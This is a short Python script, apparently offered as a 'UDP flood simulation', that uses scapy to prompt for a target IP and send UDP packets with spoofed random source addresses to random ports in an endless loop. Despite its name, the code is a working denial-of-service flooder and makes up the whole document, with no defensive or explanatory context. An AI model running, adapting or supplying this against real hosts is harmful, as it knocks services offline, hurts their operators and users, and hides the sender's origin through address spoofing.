import scapy.all as scp

ip_dst = input("Target IP: ")


def udpflood_simulation(ip_dst):
    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)

    udp_layer = scp.UDP(sport=scp.RandShort(), dport=scp.RandShort())
    packet = ip_layer / udp_layer

    scp.send(packet, loop=1, verbose=False)
    print(packet)


udpflood_simulation(ip_dst)
